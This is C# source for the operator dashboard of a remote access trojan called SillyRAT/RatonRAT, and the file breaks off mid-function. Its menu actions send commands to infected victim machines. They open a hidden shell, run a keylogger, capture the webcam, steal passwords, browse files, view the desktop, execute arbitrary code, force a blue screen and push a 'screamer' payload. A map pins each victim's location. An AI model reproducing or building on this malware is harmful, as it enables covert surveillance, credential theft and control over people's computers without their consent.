using System;
using System.Drawing;
using System.Windows.Forms;
using Newtonsoft.Json;
using Server.Connection;
using System.IO;
using System.Collections.Generic;
using Stuff;
using SillyRAT.ClientForms;
using System.Linq;
using RatonRAT.ClientForms;
using System.Runtime.InteropServices;
using System.Drawing.Drawing2D;
using System.Diagnostics;
using RatonRAT;
using GMap.NET;
using GMap.NET.WindowsForms;
using GMap.NET.MapProviders;
using System.Threading.Tasks;
using System.Text;
using System.Threading;

namespace SillyRAT
{
    public partial class Form2 : Form
    {
        private Image buttonImage;
        private Image button2Image;
        private Image button3Image;
        private Image button4Image;
        private Image button5Image;
        private Image button6Image;
        private Image button7Image;

        private GMapOverlay markersOverlay;

        private bool isMouseDown = false;

        private Point mouseOffset;

        private static UserConfig userConfig;

        private static void LoadConfig()
        {
            string configFilePath = "Data/userConfig.json";
            if (File.Exists(configFilePath))
            {
                string json = File.ReadAllText(configFilePath);
                userConfig = JsonConvert.DeserializeObject<UserConfig>(json);
            }
            else
            {
                userConfig = new UserConfig { audioMute = false, darkMode = false, notificationMute = false };
            }
        }

        private void Form6_MouseDown(object sender, MouseEventArgs e)
        {
            isMouseDown = true;
            mouseOffset = new Point(e.X, e.Y);
        }

        private void Form6_MouseMove(object sender, MouseEventArgs e)
        {
            if (isMouseDown)
            {
                this.Opacity = 80;
                this.Location = new Point(this.Left + e.X - mouseOffset.X, this.Top + e.Y - mouseOffset.Y);
            }
        }

        private void Form6_MouseUp(object sender, MouseEventArgs e)
        {
            isMouseDown = false;
        }

        [DllImport("user32.dll")]
        private static extern bool ShowScrollBar(IntPtr hWnd, int wBar, bool bShow);
        private const int SB_VERT = 1;
        private System.Windows.Forms.Timer fadeTimer;
        private double opacityIncrement = 0.01;

        public Form2()
        {
            InitializeComponent();
            listView1.GetType().GetProperty("DoubleBuffered",
                System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic)
                ?.SetValue(listView1, true, null);
            LoadConfig();
        }
        public void Command(string command)
        {
            Pack pack = new Pack();
            pack.Set("Packet", command);
            foreach (SillyClient client in GetSelectedClients())
            {
                client.Send(pack.Pacc());
            }
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            new RatonRAT.Classes.LightMode().Apply(this);
            button1.Region = new Region(CreateRoundPath(button1.ClientRectangle, 5));
            button2.Region = new Region(CreateRoundPath(button2.ClientRectangle, 5));
            button3.Region = new Region(CreateRoundPath(button3.ClientRectangle, 5));
            button4.Region = new Region(CreateRoundPath(button4.ClientRectangle, 5));
            button5.Region = new Region(CreateRoundPath(button5.ClientRectangle, 10));
            button6.Region = new Region(CreateRoundPath(button6.ClientRectangle, 5));
            button7.Region = new Region(CreateRoundPath(button7.ClientRectangle, 5));
            button8.Region = new Region(CreateRoundPath(button8.ClientRectangle, 13));
            button9.Region = new Region(CreateRoundPath(button9.ClientRectangle, 8));
            button10.Region = new Region(CreateRoundPath(button10.ClientRectangle, 8));
            ListViewItem meow = new ListViewItem("Client");
            meow.ImageIndex = 1;
            meow.SubItems.Add("Group");
            meow.SubItems.Add("Username");
            meow.SubItems.Add("Client ID");
            meow.SubItems.Add("Operative System");
            meow.SubItems.Add("Executing as");
            meow.SubItems.Add("Antivirus");
            listView2.Items.Add(meow);

            foreach (ColumnHeader column in Program.form2.listView2.Columns)
            {
                column.Width = -2;
            }

            int totalWidth = Program.form2.listView2.ClientSize.Width;
            int columnCount = Program.form2.listView2.Columns.Count;
            if (columnCount > 0)
            {
                int columnWidth = totalWidth / columnCount;
                foreach (ColumnHeader column in Program.form2.listView2.Columns)
                {
                    column.Width = columnWidth;
                }
            }
            ShowWorldMap();
            gMapControl1.Zoom = 3;
            gMapControl1.Zoom = 4;
            markersOverlay = new GMapOverlay("markers");
            gMapControl1.Overlays.Add(markersOverlay);

            string TIMERTEXT = "Log date";
            string MESSAGETEXT = "Message";

            ListViewItem item = new ListViewItem(TIMERTEXT);
            listView1.Items.Add(item);
            item.SubItems.Add(MESSAGETEXT);
            this.MouseDown += Form6_MouseDown;
            this.MouseMove += Form6_MouseMove;
            this.MouseUp += Form6_MouseUp;
            buttonImage = RatonRAT.Properties.Resources.builder;
            button1.Invalidate();
            button2Image = RatonRAT.Properties.Resources.Config;
            button2.Invalidate();
            button3Image = RatonRAT.Properties.Resources.map;
            button3.Invalidate();
            button4Image = RatonRAT.Properties.Resources.credit;
            button4.Invalidate();
            button5Image = RatonRAT.Properties.Resources.ratt;
            button5.Invalidate();
            button6Image = RatonRAT.Properties.Resources.githubbb;
            button6.Invalidate();
            button7Image = RatonRAT.Properties.Resources.icons8_heart_100;
            button7.Invalidate();
            clearLogsToolStripMenuItem.Click += clearLogsToolStripMenuItem_Click;
            buscarToolStripMenuItem.Click += buscarToolStripMenuItemcopiarToolStripMenuItem_Click;
            copiarToolStripMenuItem.Click += copiarToolStripMenuItem_Click;
            copySelectedLogToolStripMenuItem.Click += copySelectedLogToolStripMenuItem_Click;
            listView1.MouseClick += listView1_MouseClick;

            string greet;
            int taim = DateTime.Now.Hour;
            if (taim >= 6 && taim < 13)
                greet = "Good morning, " + Environment.UserName + "!\nManage your clients with a right click!\nWhat a nice way to start the day :D";
            else if (taim >= 13 && taim < 18)
                greet = "Good afternoon, " + Environment.UserName + "!\nManage your clients with a right click!\nEverything is alright in your life? :3";
            else if (taim >= 18 && taim < 21)
                greet = "Good evening, " + Environment.UserName + "!\nManage your clients with a right click!\nStill working? Keep it up!";
            else
                greet = "Good night, " + Environment.UserName + "!\nManage your clients with a right click!\nStop ratting and go to sleep plz :O";

            if (!userConfig.notificationMute)
            {
                notifyIcon1.BalloonTipTitle = "Raton Access Tool";
                notifyIcon1.BalloonTipText = greet;
                notifyIcon1.BalloonTipIcon = ToolTipIcon.Info;
                notifyIcon1.ShowBalloonTip(3000);
            }

            ShowScrollBar(listView1.Handle, SB_VERT, true);
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
        }


        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        public void AddLog(string message, Color color)
        {
            if (listView1.InvokeRequired)
            {
                listView1.Invoke(new Action(() => AddLog(message, color)));
                return;
            }

            string time = DateTime.Now.ToString("hh:mm:ss tt");

            ListViewItem item = new ListViewItem(time);
            item.SubItems.Add(message);
            item.ForeColor = color;
            item.ImageIndex = 0;  

            listView1.Items.Add(item);
            foreach (ColumnHeader column in Program.form2.listView1.Columns)
            {
                column.Width = -2;
            }

            int totalWidth = Program.form2.listView1.ClientSize.Width;
            int columnCount = Program.form2.listView1.Columns.Count;
            if (columnCount > 0)
            {
                int columnWidth = totalWidth / columnCount;
                foreach (ColumnHeader column in Program.form2.listView1.Columns)
                {
                    column.Width = columnWidth;
                }
            }
        }



        private void listView1_SelectedIndexChanged(object sender, EventArgs e) { }

        public void fade()
        {
            fadeTimer = new System.Windows.Forms.Timer
            {
                Interval = 5
            };
            fadeTimer.Tick += FadeIn_Tick;
            fadeTimer.Start();
        }

        private void FadeIn_Tick(object sender, EventArgs e)
        {
            try
            {
                if (Opacity < 1)
                {
                    this.Invoke(new Action(() =>
                    {
                        Opacity += opacityIncrement;
                    }));
                }
                else
                {
                    fadeTimer.Stop();
                    fadeTimer.Dispose();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        private void buscarToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }
        public void ClearLogs()
        {
            if (InvokeRequired)
            {
                Invoke(new Action(ClearLogs));
            }
            else
            {
                listView1.Items.Clear();
            }
        }

        private void CopyLog()
        {
            if (listView1.SelectedItems.Count > 0)
            {
                Clipboard.SetText(listView1.SelectedItems[0].SubItems[1].Text); 
            }
            else
            {
                MessageBox.Show("Press the time of the log to select", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void SearchLog()
        {
            string searchQuery = Microsoft.VisualBasic.Interaction.InputBox("Please enter what you would like to search", "Search Logs", "");

            if (!string.IsNullOrEmpty(searchQuery))
            {
                bool found = false;

                foreach (ListViewItem item in listView1.Items)
                {
                    if (item.SubItems[1].Text.Contains(searchQuery) || item.Text.Contains(searchQuery))
                    {
                        found = true;
                        item.Selected = true; 
                        listView1.EnsureVisible(item.Index); 
                        break; 
                    }
                }

                if (!found)
                {
                    MessageBox.Show("No matching logs found.", "Search Result", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        public class LogEntry
        {
            public string Time { get; set; }
            public string Message { get; set; }
        }

        private void ExportLogsToJson()
        {
            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "JSON Files (*.json)|*.json";
                saveFileDialog.Title = "Export Logs";

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var logList = new List<LogEntry>();

                    foreach (ListViewItem item in listView1.Items)
                    {
                        var logEntry = new LogEntry
                        {
                            Time = item.Text,  
                            Message = item.SubItems[1].Text  
                        };
                        logList.Add(logEntry);
                    }

                    File.WriteAllText(saveFileDialog.FileName, JsonConvert.SerializeObject(logList, Formatting.Indented));
                    MessageBox.Show("Logs exported successfully", "SillyRAT", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        private void clearLogsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ClearLogs();
            string TIMERTEXT = "Log date";
            string MESSAGETEXT = "Message";
            ListViewItem item = new ListViewItem(TIMERTEXT);
            listView1.Items.Add(item);
            item.SubItems.Add(MESSAGETEXT);
        }

        private void copySelectedLogToolStripMenuItem_Click(object sender, EventArgs e)
        {
            CopyLog();
        }

        private void buscarToolStripMenuItemcopiarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SearchLog();
        }

        private void copiarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ExportLogsToJson();
        }

        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    contextMenuStrip1.Show(listView1, e.Location);
                }
                else
                {
                    contextMenuStrip1.Show(Cursor.Position);
                }
            }
        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void serverToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void sillyRATToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form4 form4 = new Form4();
            form4.Show();
        }

        private void builderToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            Form3 form3 = new Form3();
            form3.Show();
        }

        private void blockClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form5 form5 = new Form5(this);
            form5.Show();
        }

        private void listView2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void textToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void textToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Command("Update");
        }

        private void menu4ToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void clientInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {

            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Client information | Client ID: ";
                FormInformation infoForm = (FormInformation)Application.OpenForms[formname + client.uid];
                if (infoForm == null)
                {
                    infoForm = new FormInformation
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    infoForm.Show();
                    Command("Clientinfo");
                }
            }
        }


        private List<SillyClient> GetSelectedClients()
        {
            List<SillyClient> list = new List<SillyClient>();
            foreach (ListViewItem listViewItem in listView2.SelectedItems)
            {
                if (listViewItem.Tag is SillyClient client)
                {
                    list.Add(client);
                }
                else
                {
                    MessageBox.Show("This is NOT a client", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }

            string message = list.Count > 0 ? string.Join("\n", list.Select(c => c.uid)) : "No clients selected";
            Console.WriteLine("User selection | ID: " + message);
            return list;
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Restart");
        }

        private void logOffToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("LogOff");
        }

        private void itemToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Command("Shutdown");
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Kill");
        }

        private void menu3ToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void itemToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            Command("StartShell");
            Program.form2.Invoke(new Action(() =>
            {
                Program.form2.AddLog("The shell session has been sent", Color.White);
            }));
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Hidden Cprompt | Client ID: ";
                FormShell shellForm = (FormShell)Application.OpenForms[formname + client.uid];
                if (shellForm == null)
                {
                    shellForm = new FormShell
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    shellForm.Show();
                }
            }
        }

        private void itemToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Webcam | Client ID: ";
                FormWebcam webcamForm = (FormWebcam)Application.OpenForms[formname + client.uid];
                if (webcamForm == null)
                {
                    webcamForm = new FormWebcam
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    webcamForm.Show();
                    Command("Webcam");
                }
            }
        }

        private void itemToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Send notepad | Client ID: ";
                FormNotepad formNotepad = (FormNotepad)Application.OpenForms[formname + client.uid];
                if (formNotepad == null)
                {
                    formNotepad = new FormNotepad
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formNotepad.Show();
                }
            }
        }

        private void processSpyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "ProcessSpy");
            pack.Set("Command", "List");

            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Process spy | Client ID: ";
                Formproccess processForm = (Formproccess)Application.OpenForms[formname + client.uid];
                if (processForm == null)
                {
                    processForm = new Formproccess
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    processForm.Show();
                    client.Send(pack.Pacc());
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private async void pictureBox3_Click(object sender, EventArgs e)
        {
            Size targetSize = new Size(1063, 0);
            Size startSize = new Size(1063, 559);
            int delay = 500 / 40;

            for (int i = 0; i <= 40; i++)
            {
                float t = (float)i / 40;
                int width = (int)(startSize.Width + (targetSize.Width - startSize.Width) * t);
                int height = (int)(startSize.Height + (targetSize.Height - startSize.Height) * t);

                this.Size = new Size(width, height);
                await Task.Delay(delay);
            }
            this.WindowState = FormWindowState.Minimized;
            this.Size = new Size(1063, 559);
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void button7_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            Process.Start("https://github.com/S-illy");
        }

        private void button6_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            Process.Start("https://ko-fi.com/silly69");
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            Process.Start("https://t.me/dumbasssilly");
        }
        private void button1_Click(object sender, EventArgs e)
        {
            this.Opacity = 70;

            foreach (Form form in Application.OpenForms)
            {
                if (form is Form3)
                {
                    form.Activate();
                    return;
                }
            }

            Form3 form3 = new Form3();
            form3.Show();
            Server.Classes.SFX.click();
        }


        private void button4_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            button8.Visible = true;
            label4.Text = "Client world map";
            label5.Text = "Search your clients on this map (with pins!)";
            pictureBox4.BackgroundImage = RatonRAT.Properties.Resources.pin;
            gMapControl1.Visible = true;
        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            Form7 form7 = new Form7();
            form7.Show();
        }

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "RemoteDesktop");
            pack.Set("Command", "Screens");


            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Remote desktop | Client ID: ";
                FormRemote desktopForm = (FormRemote)Application.OpenForms[formname + client.uid];
                if (desktopForm == null)
                {
                    desktopForm = new FormRemote
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    desktopForm.Show();
                    client.Send(pack.Pacc());
                }
            }
        }

        private void reverseToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Reverse");
        }

        private void normalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Normal");
        }

        private void wallpaperToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Wallpaper | Client ID: ";
                FormWallpaper formWallpaper = (FormWallpaper)Application.OpenForms[formname + client.uid];
                if (formWallpaper == null)
                {
                    formWallpaper = new FormWallpaper
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formWallpaper.Show();
                }
            }
        }
        private void funPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Fun panel | Client ID: ";
                FormFun formFun = (FormFun)Application.OpenForms[formname + client.uid];
                if (formFun == null)
                {
                    formFun = new FormFun
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formFun.Show();
                }
            }
        }

        private void gMapControl1_Load(object sender, EventArgs e)
        {

        }

        public void ShowWorldMap()
        {
            gMapControl1.MapProvider = GMapProviders.OpenStreetMap;
            gMapControl1.Position = new PointLatLng(0, 0);
            gMapControl1.MinZoom = 4;
            gMapControl1.MaxZoom = 6;
            gMapControl1.Zoom = 4;
            gMapControl1.SetPositionByKeywords("world");

            gMapControl1.DragButton = MouseButtons.Left;
            gMapControl1.CanDragMap = true;
            gMapControl1.ShowCenter = false;
            gMapControl1.MouseWheelZoomEnabled = true;
            gMapControl1.MouseWheelZoomType = MouseWheelZoomType.ViewCenter;
        }

        public void AddMarker(GMapMarker marker)
        {
            markersOverlay.Markers.Add(marker);
            gMapControl1.Refresh();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            Configuration config = new Configuration();
            config.Show();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            label4.Text = "Client dashboard";
            label5.Text = "Manage your clients here and watch the logs too!";
            pictureBox4.BackgroundImage = RatonRAT.Properties.Resources.remote;
            button8.Visible = false;
            gMapControl1.Visible = false;
        }

        private void panel3_Paint(object sender, PaintEventArgs e)
        {

        }

        private void requestAdminToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Request");
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Shutdown");
        }

        private void logOffToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Command("LogOff");
        }

        private void restartToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Command("Restart");
        }

        private void visitURLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "URL | Client ID: ";
                FornURL formURL = (FornURL)Application.OpenForms[formname + client.uid];
                if (formURL == null)
                {
                    formURL = new FornURL // my bad
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formURL.Show();
                }
            }
        }

        private void itemToolStripMenuItem4_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Port spy | Client ID: ";
                FormPorts formPorts = (FormPorts)Application.OpenForms[formname + client.uid];
                if (formPorts == null)
                {
                    formPorts = new FormPorts
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formPorts.Show();
                    Command("PortSpy");
                }
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Keylogger | Client ID: ";
                FormKeylogger formKeylogger = (FormKeylogger)Application.OpenForms[formname + client.uid];
                if (formKeylogger == null)
                {
                    formKeylogger = new FormKeylogger
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formKeylogger.Show();
                    Command("Keylogger");
                }
            }
        }

        private void passwordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Passwords | Client ID: ";
                FormPassword formPassword = (FormPassword)Application.OpenForms[formname + client.uid];
                if (formPassword == null)
                {
                    formPassword = new FormPassword
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formPassword.Show();
                    Command("GetPassword");
                }
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "Manager");
            pack.Set("Action", "Drives");
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "FM | Client ID: ";
                FormFileManager formFileManager = (FormFileManager)Application.OpenForms[formname + client.uid];
                if (formFileManager == null)
                {
                    formFileManager = new FormFileManager
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formFileManager.Show();
                    client.Send(pack.Pacc());
                }
            }
        }

        private void executeCodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Execute code | Client ID: ";
                FormExecute formExecute = (FormExecute)Application.OpenForms[formname + client.uid];
                if (formExecute == null)
                {
                    formExecute = new FormExecute
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formExecute.Show();
                }
            }
        }

        private void blockWebsitesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Block url | Client ID: ";
                FormBlockURL formBlockURL = (FormBlockURL)Application.OpenForms[formname + client.uid];
                if (formBlockURL == null)
                {
                    formBlockURL = new FormBlockURL
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formBlockURL.Show();
                }
            }
        }

        private void toolStripSeparator4_Click(object sender, EventArgs e)
        {
            Command("BSOD");
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Play audio | Client ID: ";
                FormSound formSound = (FormSound)Application.OpenForms[formname + client.uid];
                if (formSound == null)
                {
                    formSound = new FormSound
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formSound.Show();
                }
            }
        }

        private void screamerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                DialogResult result = MessageBox.Show("DO NOT IGNORE THIS WARNING\nYou are about to run a screamer\nMake sure that the client does not have heart problems\nPlease don't be foolish and choose wisely. Do you really want to continue?", "SCREAMER WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (result == DialogResult.Yes)
                {
                    string screamerPath = "ratas\\Screamer.dll";
                    if (File.Exists(screamerPath))
                    {
                        string fileName = Path.GetFileName(screamerPath);
                        string Duid = Helpers.Random();
                        long fileSize = new FileInfo(screamerPath).Length;

                        FormFile fileForm = (FormFile)Application.OpenForms["File ID: " + Duid];
                        if (fileForm == null)
                        {
                            fileForm = new FormFile
                            {
                                Name = "File ID: " + Duid,
                                Text = "File ID: " + Duid,
                                SillyClient = client,
                                UID = client.uid,
                                FileName = fileName,
                                FileSize = fileSize
                            };
                            fileForm.Show();

                            Task.Run(() =>
                            {
                                if (fileSize > 0)
                                {
                                    Pack pack = null;
                                    int count = 1;

                                if (fileSize < SillyClient.OneMb)
                                    {
                                        pack = new Pack();
                                        pack.Set("Packet", "Upload");
                                        pack.Set("isCompleted", false);
                                        pack.Set("TempName", Helpers.MD5_STRING(Encoding.UTF8.GetBytes(fileName + Duid + count)));
                                        pack.Set("FileBytes", File.ReadAllBytes(screamerPath));
                                        client.Send(pack.Pacc());
                                        fileForm.TotalFileSize += fileSize;
                                    }
                                    else
                                    {
                                        int bytesRead = 0;
                                        long totalSize = fileSize;
                                        byte[] buffer = new byte[SillyClient.OneMb];

                                        using (Stream source = File.OpenRead(screamerPath))
                                        {
                                            while (((bytesRead = source.Read(buffer, 0, buffer.Length)) > 0) && client.isConnected())
                                            {
                                                pack = new Pack();
                                                pack.Set("Packet", "Upload");
                                                pack.Set("isCompleted", false);
                                                pack.Set("TempName", Helpers.MD5_STRING(Encoding.UTF8.GetBytes(Path.GetFileName(screamerPath) + Duid + (count++).ToString())));
                                                pack.Set("FileBytes", buffer);
                                                client.Send(pack.Pacc());
                                                fileForm.TotalFileSize += buffer.Length;
                                                totalSize -= bytesRead;
                                                if (totalSize < SillyClient.OneMb)
                                                    buffer = new byte[totalSize];
                                            }
                                        }
                                    }

                                    pack = new Pack();
                                    pack.Set("Packet", "Upload");
                                    pack.Set("DUID", Duid);
                                    pack.Set("isCompleted", true);
                                    pack.Set("FileName", fileName);
                                    pack.Set("FileSize", new FileInfo(screamerPath).Length);
                                    pack.Set("FilePath", "TempClient");
                                    pack.Set("isPlugin", true);
                                    pack.Set("TempCount", count);
                                    client.Send(pack.Pacc());
                                }

                                Thread.Sleep(800);
                                this.Invoke(new MethodInvoker(() => fileForm.progressBar1.Value = 100));
                                fileForm.timer2.Stop();
                                fileForm.Status("Our rats are eating cheese...");
                            });
                        }
                    }
                    else
                    {
                        MessageBox.Show("Error: screamer.dll not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }

                }
                else
                {
                    MessageBox.Show("You saved someone's heart", "How mature", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        private void scanDevicesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("StartShell");
            Program.form2.Invoke(new Action(() =>
            {
                Program.form2.AddLog("The shell session has been sent", Color.White);
            }));
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Hidden Cprompt | Client ID: ";
                FormShell shellForm = (FormShell)Application.OpenForms[formname + client.uid];
                if (shellForm == null)
                {
                    shellForm = new FormShell
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    shellForm.Show();
                    Pack pack = new Pack();
                    pack.Set("Packet", "Shell");
                    pack.Set("Command", "arp -a");
                    client.Send(pack.Pacc());
                }
            }
        }

        private void messageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Message box | Client ID: ";
                FormMessageBox formMessageBox = (FormMessageBox)Application.OpenForms[formname + client.uid];
                if (formMessageBox == null)
                {
                    formMessageBox = new FormMessageBox
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formMessageBox.Show();
                }
            }
        }

        private void button9_Click(object sender, EventArgs e)
        {
            Form6 form6 = new Form6();
            form6.Show();
        }

        private void rataManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "plugin manager | Client ID: ";
                FormPlugin formPlugin = (FormPlugin)Application.OpenForms[formname + client.uid];
                if (formPlugin == null)
                {
                    formPlugin = new FormPlugin
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formPlugin.Show();
                }
            }
        }

        private void notesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Notes | Client ID: ";
                Notes notes = (Notes)Application.OpenForms[formname + client.uid];
                if (notes == null)
                {
                    notes = new Notes
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                        clientID = client.uid,
                    };
                    notes.Show();
                }
            }
        }

        private void button1_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;

            float scale = Math.Min((float)button1.Width / buttonImage.Width, (float)button1.Height / buttonImage.Height) * 0.7f;
            int newWidth = (int)(buttonImage.Width * scale);
            int newHeight = (int)(buttonImage.Height * scale);
            int x = 5;
            int y = (button1.Height - newHeight) / 2;

            e.Graphics.DrawImage(buttonImage, new Rectangle(x, y, newWidth, newHeight));
        }

        private void button2_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;

            float scale = Math.Min((float)button1.Width / buttonImage.Width, (float)button1.Height / button2Image.Height) * 0.7f;
            int newWidth = (int)(button2Image.Width * scale);
            int newHeight = (int)(button2Image.Height * scale);
            int x = 5;
            int y = (button1.Height - newHeight) / 2;

            e.Graphics.DrawImage(button2Image, new Rectangle(x, y, newWidth, newHeight));
        }

        private void button4_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;

            float scale = Math.Min((float)button1.Width / buttonImage.Width, (float)button1.Height / button2Image.Height) * 0.7f;
            int newWidth = (int)(button2Image.Width * scale);
